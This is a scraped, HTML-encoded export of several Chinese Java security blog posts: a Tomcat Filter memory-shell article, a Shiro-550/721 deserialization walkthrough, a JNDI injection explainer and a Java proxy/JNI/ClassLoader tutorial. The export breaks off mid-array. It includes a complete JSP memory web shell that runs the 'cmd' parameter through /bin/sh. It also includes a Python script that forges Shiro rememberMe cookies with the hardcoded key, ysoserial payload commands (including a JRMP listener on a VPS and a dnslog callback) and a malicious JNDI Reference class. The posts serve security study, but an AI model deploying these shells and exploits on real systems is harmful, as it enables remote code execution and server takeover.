import&#x3D;&quot;java.util.HashMap&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;&lt;% Object obj &#x3D; request.getServletContext(); Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj); field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext); FilterDef filterDef &#x3D; new FilterDef(); filterDef.setFilterName(&quot;testF&quot;); standardContext.addFilterDef(filterDef); &#x2F;&#x2F; 在context中添加filterMap时会去找一下是否存在对应的filterdef Filter filter &#x3D; new testF(); filterDef.setFilter(filter); &#x2F;&#x2F; 将我们创建的filter与filterdef相关联起来 field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); field.setAccessible(true); HashMap hashMap &#x3D; (HashMap) field.get(standardContext); Constructor constructor &#x3D; Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); hashMap.put(&quot;testF&quot;,constructor.newInstance(standardContext,filterDef)); FilterMap filterMap &#x3D; new FilterMap(); filterMap.addURLPattern(&quot;&#x2F;*&quot;); filterMap.setFilterName(&quot;testF&quot;); standardContext.addFilterMapBefore(filterMap); System.out.println(&quot;filter ok !&quot;);%&gt;&lt;%! public class testF implements Filter &#123; public void destroy() &#123; &#125; public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123; String cmder &#x3D; req.getParameter(&quot;cmd&quot;); String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;; try &#123; Process ps &#x3D; Runtime.getRuntime().exec(cmd); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb &#x3D; new StringBuffer(); String line; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; &#x2F;&#x2F;执行结果加上回车 sb.append(line).append(&quot;&lt;br&gt;&quot;); &#125; String result &#x3D; sb.toString(); resp.getWriter().write(result); &#125;catch (Exception e)&#123; System.out.println(&quot;error &quot;); &#125; chain.doFilter(req,resp); &#125; public void init(FilterConfig config) throws ServletException &#123; &#125; &#125;%&gt; 总结个人感觉这篇文章写的比较乱，特别是Filter内存马。这也是我拖了3个月才来搞的东西，这学期事有点多，很多之前想搞的东西都没腾出时间弄。这篇文章讲到的内存马实际上并没有实现完全的无文件落地，中间会有恶意JSP文件落地。更高级的攻击形式后面再搞吧。 参考http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/ https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext https://blog.csdn.net/angry_program/article/details/116661899","categories":[],"tags":[{"name":"java开发与安全","slug":"java开发与安全","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"shiro反序列化(shiro-550与shiro-721)","slug":"shiro反序列化(shiro-550与shiro-721)","date":"2021-06-28T13:51:11.047Z","updated":"2021-03-13T07:19:29.768Z","comments":true,"path":"2021/06/28/shiro反序列化(shiro-550与shiro-721)/","link":"","permalink":"http://const27.com/2021/06/28/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro-550%E4%B8%8Eshiro-721)/","excerpt":"","text":"shiroApache shiro 是java的一个安全框架，可以帮助完成认证，授权，加密，会话管理等功能。它不跟任何框架或容器绑定，可以独立运行。 怎么判断是否是shiro网站发送cookie带有rememberMe=0的包，若返回包的头部有rememberMe，则为shiro站点 shiro-550简介当shiro版本小于1.2.5时，主要是由shiro的rememberMe内容反序列化导致的命令执行漏洞，造成的原因是AES密钥被硬编码在shiro源码中，这就导致了可以通过在cookie的rememberMe字段插入payload实现任意代码执行 前期准备git clone https://github.com/apache/shiro.git 下载shiro 然后 git checkout shiro-root-1.2.4,切换到1.2.4版本进行对应版本的漏洞调试 编辑shiro/samples/web/pom.xml文件，在此处加入 1.2 然后idea打开shiro/samples/web 下的pom.xml,然后Run -&gt; Edit Configurations 添加TomcatServer 待idea加载完maven后，向tomcat部署工件 出现以下页面则说明环境搭建成功 开始动调序列化，加密在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin 处下断点 然后进入shiro登陆页面，勾选rememberme，进行登录，断点命中 然后会校验token里面的rememberme是否为true，若为true则执行rememberIdentity函数 我们跟进rememberIdentity函数 发现principals变量获取了需要remember的用户名（此处为root），然后再调用重载函数rememberIdentity。这个函数调用了convertPrincipalsToBytes,我们跟进看看这个函数 可以发现对传入的principals调用了serialize方法，继续跟进serialize方法 继续跟进serialize会来到这个地方 发现就是对其调用了writeObject()这个原生反序列方法而已，没什么好康的，转回头去看看convertPrincipalsToBytes那个加密函数encrypt 发现通过getCipherService方法返回了一个东西，发现是加密方式等东西 在此处156行会调用另一个encrypt方法，其中第一个参数是序列化后的用户名，第二个参数则是密钥（这个密钥是硬编码写入文件的，所以造成了安全问题）我们跟进 这里的ivBytes是一个随机生成的iv（我没跟进细看),然后在这个方法最后它调用了encrypt的重载函数，并传入了序列化后的用户名，key，iv，以及一个true。我们继续跟进 可以发现通过arraycopy，把iv和加密后的密文数据（aes）放入了output,最后返回了output. 然后这个return会一直返回到此处 output的内容作为参数传入了rememberSerializedIdentity，跟进该函数 56行，把base64加密后的output作为值写入到cookie中的remembername键 57行将其返回给客户端 burp抓包发现事实确实如此 另外说一下那个硬编码key，那个硬编码的key在AbstractRememberMeManager.class DEFAULT_CIPHER_KEY_BYTES里 可以发现通过getEncryptionCipherKey获得的key确实是DEFAULT_CIPHER_KEY_BYTES 我们简要的梳理一下这个流程， 当我们勾选rememberme后，用户名会被序列化处理，然后与硬编码的key，随机生成的iv一起进行加密，然后以 iv+密文 的base64编码返回给用户的键为rememberme的cookie里。 反序列化，解密在我们勾选rememberme登陆后，刷新，抓包，将其JSESSIONID删除，使shiro验证cookie中rememberme的值是否正确（如果不删除JSESSIONID，shiro则直接以JSESSIONID为登陆凭证了，就不会验证rememberme中的值了） 在org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity 打下断点，放包，断点命中。 跟进getRememberedPrincipals方法 随后再跟进getRememberedSerializedIdentity 关注这里的86行，此处的意思是从cookie中获得base64编码后的cookie值，随后在90行对其进行填充（CBC加密中的一个流程），95行进行base64解码，并将其返回 随后我们回到getRememberedPrincipals方法，跟进其convertBytesToPrincipals方法 发现其中有个decrypt方法，这里的decrypt方法就是对其行aes解密，取前十六位为IV。 下面140行则是对其进行反序列化处理了。我们跟进一下 再次跟进deserialize方法 看到readObject,就意味着反序列化流程结束了。 梳理一下，cookie中remenber值传入后先base64解码，然后aes解密，然后反序列化。 解密，重写cookie，以写入payload既然key是固定的，我们知道了key是什么，同时在CBC解密的时候，IV的作用只是作为第一个区块去解密第二个区块（生成的结果去解密第三个区块，以此类推），所以IV可以为随机值没什么特别要求（只要能解密就行了）那么我们就可以自己伪造一个cookie。 python脚本如下(嫖的笑师傅的)，序列化payload用base64格式传入 #pip install pycryptoimport sysimport base64import uuidfrom random import Randomimport subprocessfrom Crypto.Cipher import AESkey &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;mode &#x3D; AES.MODE_CBCIV &#x3D; uuid.uuid4().bytesencryptor &#x3D; AES.new(base64.b64decode(key), mode, IV)payload&#x3D;base64.b64decode(sys.argv[1])BS &#x3D; AES.block_sizepad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()payload&#x3D;pad(payload)print(base64.b64encode(IV + encryptor.encrypt(payload))) 然后我们只需要传入base64编码的，去除换行符的payload即可。 像这样 java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\\n&#x2F;&#x2F;;b label&#39; 密钥获取有些时候key并不是一成不变的kPH+bIxk5D2deZiIxcaaaA==，而有可能是其他值，我们可以用工具https://github.com/insightglacier/Shiro_exploit 来爆破出密钥 python .\\shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 即可开始爆破，当然这个工具的作用不仅仅如此 利用URLDNS这个链其实根本没啥危害..只是拿来测试一下有没有洞 java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\\n&#x2F;&#x2F;;b label&#39; 生成payload，像cookie伪造脚本传入，获得伪造的cookie rememberme登陆后，刷新抓包，删除cookie中的session，替换cookie中的rememberme为伪造后的cookie。放包,DNSLOG有反应 cc链cc链2java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s&#x2F;\\n&#x2F;&#x2F;;b label&#39; 然后制作cookie，发过去，成功弹计算器 JRMP通过运行mvn dependency:list 命令可以发现当前Commons Collections 的版本是3.2.1 按理说会有cc链5，但是实际上用ysoserial 生成payload用上面的方法打过去后没有反应。看别人博客发现是这个原因 “Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。” 解决这种问题的办法是用JRMP vps上执行以下命令，监听端口 java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 &#39;calc&#39; 我们再通过ysoserial生成payload java -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#39;vps_ip:12006&#39;|base64|sed &#39;:label;N;s&#x2F;\\n&#x2F;&#x2F;;b label&#39; 然后伪造cookie，发过去，成功弹计算器 小总结这个洞因为cookie中的值使用硬编码的key加密而成，我们可以以此来伪造cookie，顺便在cookie里写入危险的paylaod如cc链payload，使cookie中的值被解密，随后经历反序列化，造成命令执行 参考：https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E 笑师傅大大 shiro-721去年学的Padding Oracle 在此处被利用了起来。可以先看看Padding Oracle Attack 大概是个啥https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/ 影响版本： 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1 简介其实漏洞代码层面逻辑上和shiro-550大致相似，只不过key没有硬编码进代码中了。但是只要我们获得一个rememberme用户的cookie后就可以通过padding oracle attack 伪造任意cookie发过去了，从而造成反序列化漏洞了 环境搭建在这里下载1.4.1的war包https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war，并放入tomcat webapps文件夹，随后启动tomcat，访问http://127.0.0.1:8080/samples-web-1.4.1/ 利用大致逻辑与shiro-550差不多，直接说利用吧。 https://github.com/inspiringz/Shiro-721 使用这个工具 首先我们得勾选rememberme，抓包获得rememberme cookie 然后通过ysoserial生成payload，将其通过管道符传入某个文件，随后用刚刚那个工具里的shiro_exp.py python .&#x2F;shiro_exp.py &lt;url&gt; &lt;cookie&gt; &lt;paylaod文件&gt; 随后会进行爆破，最后获得结果cookie后，传入并发包过去即可（爆破时间很长）","categories":[],"tags":[{"name":"java开发与安全","slug":"java开发与安全","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"JNDI注入原理浅析","slug":"JNDI注入原理浅析","date":"2021-06-28T13:51:11.045Z","updated":"2021-06-28T13:50:45.147Z","comments":true,"path":"2021/06/28/JNDI注入原理浅析/","link":"","permalink":"http://const27.com/2021/06/28/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/","excerpt":"","text":"JNDI注入依赖RMI，所以在学习JNDI注入前务必了解一下RMI JNDI 简介JNDI (Java Naming and Directory Interface) 是一个java中的技术，用于提供一个访问各种资源的接口。比如通过JNDI可以在局域网上定位一台打印机，或者定位数据库服务，远程JAVA对象等。JNDI底层支持RMI远程对象，RMI注册的服务可以直接被JNDI接口访问调用。 JNDI注入RMI工作原理首先我们先思考一下RMI的工作原理是什么。 1.服务器创建好继承于Remote接口的类，并把它绑定到RMI服务器上2.客户端请求RMI服务器上的类3.服务端返回客户端所请求类的存根stub，客户端将这个stub看作实例化对象使用4.客户端调用stub的某个方法，并传入参数。该参数会发送到RMI服务器上，由RMI服务器按照客户端传来的参数来执行指定的方法5.服务器执行完后将结果返回给客户端 所以从RMI这一端来看，客户端获取了远程对象后所执行的此对象的方法，都是由RMI服务器来执行的。 JNDI 与 RMI 的区别rmi调用远程对象和JNDI调用远程对象，在代码上是有差别的 如下是RMI创建和调用远程对象 import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.Properties;import java.rmi.registry.Registry;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;interface IHello extends Remote &#123; public String sayHello(String name) throws RemoteException;&#125;class IHelloImpl extends UnicastRemoteObject implements IHello &#123; protected IHelloImpl() throws RemoteException &#123; super(); &#125; public String sayHello(String name) throws RemoteException &#123; return &quot;Hello &quot; + name + &quot; ^_^ &quot;; &#125;&#125;public class CallService &#123; public static void main(String args[]) throws Exception &#123; IHello hello &#x3D; new IHelloImpl(); Naming.bind(&quot;hello&quot;, hello); IHello rHello &#x3D; (IHello) Naming.lookup(&quot;hello&quot;); System.out.println(rHello.sayHello(&quot;RickGray&quot;)); &#125;&#125; 而JNDI调用远程对象的过程如下，多了一步设置JNDI环境 import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.Properties;import java.rmi.registry.Registry;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;interface IHello extends Remote &#123; public String sayHello(String name) throws RemoteException;&#125;class IHelloImpl extends UnicastRemoteObject implements IHello &#123; protected IHelloImpl() throws RemoteException &#123; super(); &#125; public String sayHello(String name) throws RemoteException &#123; return &quot;Hello &quot; + name + &quot; ^_^ &quot;; &#125;&#125;public class CallService &#123; public static void main(String args[]) throws Exception &#123; &#x2F;&#x2F; 配置 JNDI 默认设置 Properties env &#x3D; new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;localhost:1022&quot;); Context ctx &#x3D; new InitialContext(env); &#x2F;&#x2F; 本地开启 1022 端口作为 RMI 服务，并以标识 &quot;hello&quot; 绑定方法对象 Registry registry &#x3D; LocateRegistry.createRegistry(1022); IHello hello &#x3D; new IHelloImpl(); registry.bind(&quot;hello&quot;, hello); &#x2F;&#x2F; JNDI 获取 RMI 上的方法对象并进行调用 IHello rHello &#x3D; (IHello) ctx.lookup(&quot;hello&quot;); System.out.println(rHello.sayHello(&quot;tom&quot;)); &#125;&#125; Reference类首先来看一下如何创建一个对象Reference并将其绑定到RMI服务器上 ......定义好了registry，它是一个Registry对象（RMI中用于将类注册到服务器上的对象）Reference refObj &#x3D; new Reference(&quot;refClassName&quot;, &quot;insClassName&quot;, &quot;http:&#x2F;&#x2F;a.com:12345&quot;);ReferenceWrapper refObjWrapper &#x3D; new ReferenceWrapper(refObj);registry.bind(&quot;refObj&quot;, refObjWrapper); 前面说到RMI服务器会向客户端返回stub或者说一个对象，如果RMI服务器传回客户端一个Reference对象呢？那就要说道说道了。对于RMI服务器而言，向客户端传回一个Reference对象和传回其他对象一样，并没有多大区别。但是客户端由于获取到了一个Reference实例，比如说就是上面代码中的Reference实例，接下来客户端就会先在CLASSPATH里寻找被标识为refClassName的类。如果没找到，它就会去请求http://a.com:12345/refClassName.class 对里面的类进行动态加载，并调用insClassName类的构造方法。注意，调用insClassName类的构造方法这个行为是由客户端完成的。 上面的一系列行为可以概括为xiatu JNDI 协议转换我们在通过JNDI调用远程对象时，需要设置环境，就像这样 Properties env &#x3D; new Properties();env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); &#x2F;&#x2F;设置了rmi请求方式env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);Context ctx &#x3D; new InitialContext(env); 比如以上代码，就设置了JNDI会通过rmi的方式去请求远程对象。 但是当调用lookup()或者search()时，可以直接无视环境是如何设置请求方式的，因为JNDI有协议动态转换机制。什么意思呢？看看代码就晓得了 Properties env &#x3D; new Properties();env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);Context ctx &#x3D; new InitialContext(env);ctx.lookup(&quot;ldap:&#x2F;&#x2F;a.com&#x2F;ou&#x3D;foo,dc&#x3D;foobar,dc&#x3D;com&quot;) 以上代码执行后，会调用ldap协议去请求，而不是rmi。这是因为lookup或者search函数在参数为绝对路径URI的情况下动态转换协议为参数中指定的协议。 JNDI注入如果我们满足以下条件，JNDI注入就会成功 JNDI调用的lookup参数可控URI可进行动态协议转换Reference对象指定类会被加载并实例化 其实最重要的就是第一条。 下面用一张图概括从JNDI注入到RCE的流程 1.攻击者控制了lookup参数2.攻击者将lookup参数替换为去请求恶意服务器A上的Reference对象3.恶意服务器A返回Reference对象4.受害机器获得Reference对象后先在CLASSPATH中查找Reference对象中的指定类是否存在，若不存在则请求Reference对象中指定的恶意服务器B去获得指定类5.恶意服务器B返回指定类6.受害机器得到指定类后，执行指定类的构造函数，从而达到RCE 下面是代码实现 受害机器 import java.rmi.Remote;import java.rmi.RemoteException;import javax.naming.Context;import javax.naming.InitialContext;interface IHello extends Remote &#123; abstract String sayHello(String name) throws RemoteException;&#125;public class CallService &#123; public static void main(String args[]) throws Exception&#123; if(args.length&lt;1)&#123; System.out.println(&quot;Plz input url&quot;); System.exit(-1); &#125; else &#123; &#x2F;&#x2F; JNDI 获取 RMI 上的方法对象并进行调用 Context ctx &#x3D; new InitialContext(); IHello rHello &#x3D; (IHello) ctx.lookup((String)args[0]); System.out.println(rHello.sayHello(&quot;tom&quot;)); &#125; &#125;&#125; RMI import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.*;import java.rmi.server.UnicastRemoteObject;public class evilrmi &#123; public static void main(String[] args) throws Exception&#123; Registry registry &#x3D; LocateRegistry.createRegistry(1010); Reference refObj &#x3D; new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;,&quot;http:&#x2F;&#x2F;192.168.111.1:80&#x2F;&quot;); ReferenceWrapper refObjWra &#x3D; new ReferenceWrapper(refObj); registry.bind(&quot;refObj&quot;,refObjWra); System.out.println(&quot;gogo&quot;); &#125;&#125; EvilObject import java.lang.Runtime;import java.lang.Process;public class EvilObject &#123; public EvilObject() throws Exception &#123; Runtime rt &#x3D; Runtime.getRuntime(); String[] commands &#x3D; &#123;&quot;calc&quot;&#125;; Process pc &#x3D; rt.exec(commands); pc.waitFor(); &#125;&#125; 我们先运行RMI服务器，然后把EvilObject.class放置于http://192.168.111.1:80/下，然后指定lookup参数为我们的恶意RMI服务器去运行受害机器。 如果是早期JDK版本，计算器就已经弹出来了。JDK 6u141, JDK 7u131, JDK 8u121 以及更高版本中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性，所以会执行以上流程会有如下报错 The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;. 系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。 以上是JNDI Reference+RMI的利用方式，除此之外还有一个JNDI Reference+ldap 的利用方式，操作与JNDI Reference+RMI大同小异，也就是通过ldap协议lookup一个恶意服务器并获得恶意Reference对象，并且LDAP服务的Reference远程加载Factory类不受 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以利用面更广但是在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。 JNDI注入：高版本如何利用？","categories":[],"tags":[{"name":"java开发与安全","slug":"java开发与安全","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"java安全中几个重要机制","slug":"java安全中重要的几个机制","date":"2021-06-28T13:51:11.042Z","updated":"2021-03-31T06:02:07.803Z","comments":true,"path":"2021/06/28/java安全中重要的几个机制/","link":"","permalink":"http://const27.com/2021/06/28/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/","excerpt":"","text":"java 代理代理的作用，就是在原有类的代码不发生改动的情况下，添加新功能。起到一个修饰器的作用。 假设我们现在有个类，用于打印helloworld class hello&#123; public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;&#125; 我们想在不改动hello类的前提下，在输出helloworld时同时输出当前时间到文件，达到日志的功能，该如何解决这个问题呢？以这个问题为切入点，开始学习代理。 静态代理静态代理很简单，不用接触什么新技术。就是创建一个”继承已有的一个类“的类，通过重写父类的方法，达到不改动原有类的基础上增添新功能。纸上得来终觉浅，用代码来说明一下吧。 以刚刚的输出helloworld的类为例。我们编写一个它的子类，并在其中重写其gogo方法，添加日志生成功能 class hello&#123; public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;&#125;class static_hello_proxy extends hello&#123; hello hello_obj; static_hello_proxy(hello hello)&#123; this.hello_obj &#x3D; hello; &#125; @Override public void gogo()&#123; log(); hello_obj.gogo(); &#125; public void log()&#123; Date date &#x3D; new Date(); String value &#x3D; &quot;date:&quot;+date+&quot;\\n&quot;; FileWriter writer &#x3D; null; try &#123; writer &#x3D; new FileWriter(new File(&quot;log.txt&quot;),true); writer.write(value); writer.flush(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 然后主函数中我们只需调用static_hello_proxy中的gogo()方法就能达到日志功能了。这就是静态代理。静态代理的缺点显而易见，如果我们想要代理不同的类，就要写出不同的静态代理类出来，同时我们也可能会遇到需要多个代理类来增添实现一个类的不同功能，有需要定义一大堆类出来。不容易维护，所以动态代理就诞生了，它很好的解决了静态代理会产生大量代理类的难题。 动态代理使用动态代理，可以不用创建代理类，非常的方便。 动态代理由Proxy.newProxyInstance方法实现。 我们看看它的三个参数。loader，顾名思义，就是被代理类的类加载器。interfaces 被代理类所需要实现的接口，可通过 类对象.getinterfaces()获得h 即 InvocationHandler接口类 的实现类，用于实现代理增添的方法 我们看看这个 InvocationHandler 类的结构。这个类只有一个invoke方法，且这个类是接口类。这个invoke方法就用于存放我们的增添的功能。 proxy即代理对象，method即对象中的某个方法，args即方法中的参数。 ok，接下来把刚刚那个类动态代理一下吧。但是需要注意的是动态代理只能代理接口实现类。 import java.io.File;import java.io.FileInputStream;import java.io.FileWriter;import java.io.IOException;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.util.Date;public class test &#123; public static void main(String[] args)&#123; hello hello_obj &#x3D; new hello(); ClassLoader Loader &#x3D; hello_obj.getClass().getClassLoader(); Class&lt;?&gt;[] Interfaces &#x3D; hello_obj.getClass().getInterfaces(); InvocationHandler ih &#x3D; new InvocationHandler() &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if(method.getName()&#x3D;&#x3D;&quot;gogo&quot;)&#123; FileWriter writer &#x3D; new FileWriter(&quot;log.txt&quot;); writer.write(&quot;date:&quot;+new Date()+&quot;|by 动态代理\\n&quot;); writer.flush(); hello_obj.gogo(); &#125; return null; &#125; &#125;; hello_interface proxy &#x3D; (hello_interface) Proxy.newProxyInstance(Loader,Interfaces,ih); &#x2F;&#x2F;注意这里数据类型是接口的数据类型 proxy.gogo(); &#125;&#125;interface hello_interface&#123; public void gogo();&#125;class hello implements hello_interface&#123; public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;&#125; OK,ALL DOWN JNIJNI是JAVA的一个接口，用来实现c/c++调用，为JAVA提供了一个操纵底层的能力。 JNI HelloWorldjava IDE：idea C IDE：vs2019 1.写好JAVA文件，定义好native方法。 public class test &#123; static&#123; System.loadLibrary(&quot;Dll1&quot;); &#125; public native void hello(); public static void main(String[] args) &#123; test a &#x3D; new test(); a.hello(); &#125;&#125; 2.使用javac指令为java文件的各native方法生成c语言头文件。 javac -cp . test.java -h . 执行后会在当前目录下生成一个头文件 3.用vscode创建一个dll项目，将test.h与jdk include目录下的jni.h以及jdk/include/win32/jni_md.h统统移动到项目文件目录下。然后在vscode头文件里添加现有项，把刚刚放到项目文件下的3个头文件添加进去。 4.在c或c++中定义native方法的c/c++原型。 通过test.h我们可以看到哪些方法需要我们定义。这里是Java_test_hello方法。 我们随便定义一下 #include &quot;test.h&quot;JNIEXPORT void JNICALL Java_test_hello(JNIEnv* a, jobject b) &#123; printf(&quot;Hello,World&quot;);&#125; 编译为dll文件。 5.在idea里为当前项目指定依赖dll文件路径 先点击箭头指向处的编辑选项，然后在虚拟机选项里填上-Djava.library.path=你的dll路径 6.把dll文件拖进刚刚配置好的依赖路径，运行 JNI 数据类型 JNI类型数据在c文件里当作传入参数和返回结果，参数传入后其数据类型会被用指定方法转换为C类型然后被处理，处理完毕后使用指定方法转换为JNI类型返回给JAVA。 这里介绍一下c中JNI类型与c类型互转的函数 jstring转char*：env-&gt;GetStringUTFChars(str, &amp;jsCopy)char*转jstring: env-&gt;NewStringUTF(&quot;Hello...&quot;)字符串资源释放: env-&gt;ReleaseStringUTFChars(javaString, p); JNI 实现本地命令执行相当于一个加强版的helloworld. 首先我们看一下，如果在c++中我们想执行本地命令执行该如何执行 #include&lt;iostream&gt;#include&lt;stdio.h&gt;#include &lt;string&gt;std::string gogo(const char* cmd) &#123; const char* cmd &#x3D; cmd; FILE* fp &#x3D; _popen(cmd, &quot;r&quot;); if (fp !&#x3D; NULL) &#123; std::string result; char buf[128]; while (fgets(buf, sizeof(buf), fp) !&#x3D; NULL) &#123; result +&#x3D; buf; &#125; return result; &#125;&#125;int main() &#123; std::string result &#x3D; gogo(&quot;dir&quot;); std::cout &lt;&lt; result;&#125; 那么我们在JNI里如何实现呢?其实也差不多. 我们现在写好java代码 public class test &#123; static&#123; System.loadLibrary(&quot;Dll2&quot;); &#125; public native String gogo(String cmd); public static void main(String[] args) &#123; test a &#x3D; new test(); String str &#x3D; a.gogo(&quot;dir&quot;); System.out.println(str); &#125;&#125; 写好c++代码 #include &quot;test.h&quot;#include&lt;iostream&gt;#include&lt;stdio.h&gt;#include &lt;string&gt;JNIEXPORT jstring JNICALL Java_test_gogo(JNIEnv* env, jobject obj, jstring str) &#123; const char* cmd &#x3D; env-&gt;GetStringUTFChars(str, 0); FILE* fd &#x3D; _popen(cmd, &quot;r&quot;); if (fd !&#x3D; NULL) &#123; std::string result; char buf[128]; while (fgets(buf, sizeof(buf), fd) !&#x3D; NULL) &#123; result +&#x3D; buf; &#125; _pclose(fd); return env-&gt;NewStringUTF(result.c_str()); &#125;&#125; 运行结果 类加载器ClassLoader在JVM类加载器中最顶层的是Bootstrap ClassLoader(引导类加载器)、Extension ClassLoader(扩展类加载器)、App ClassLoader(系统类加载器)，AppClassLoader是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用AppClassLoader加载类，ClassLoader.getSystemClassLoader()返回的系统类加载器也是AppClassLoader。 ClassLoader的主要方法有以下几个： loadClass(加载指定的Java类) findClass(查找指定的Java类) findLoadedClass(查找JVM已经加载过的类) defineClass(从byte[]获得一个Java类) resolveClass(链接指定的Java类) 如何通过ClassLoader获取一个类对象？很简单 Class a &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;); 它对一个类的加载流程如下: ClassLoader调用loadClass(String name)方法加载指定类 调用findLoadedClass检查指定的类是否已经初始化，若已初始化则直接返回类对象 如果创建ClassLoader时传入父类加载器，则使用父类加载器加载指定类，否则使用JVM的Bootstrap ClassLoader（引导类加载器）加载 如果以上步骤没有完成加载，则使用findClass方法尝试加载指定类 如果当前ClassLoader类没有重写findClass方法则直接返回异常。若重写了该方法且通过findClass找到了传入的类名的对应的类字节码，那么就会使用defineClass去JVM注册该类 如果loadClass调用时传入resolve的参数为true，则那么还需要调用resolveClass方法连接类。该参数默认为false 返回被JVM加载后的指定类的类对象 ClassLoader自定义java.lang.ClassLoader 是所有类加载器的父类，我们可以通过重写其findClass方法来实现自定义ClassLoader。 我们试着自定义一个，当对loadClass传入com.anbai.sec.classloader.TestHelloWorld 时会直接返回一个在加载器里已经定义好了的对应类的类对象。 class TestClassLoader extends ClassLoader&#123; String testClassName&#x3D;&quot;com.anbai.sec.classloader.TestHelloWorld&quot;; byte[] testClassBytes &#x3D; new byte[]&#123;-54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 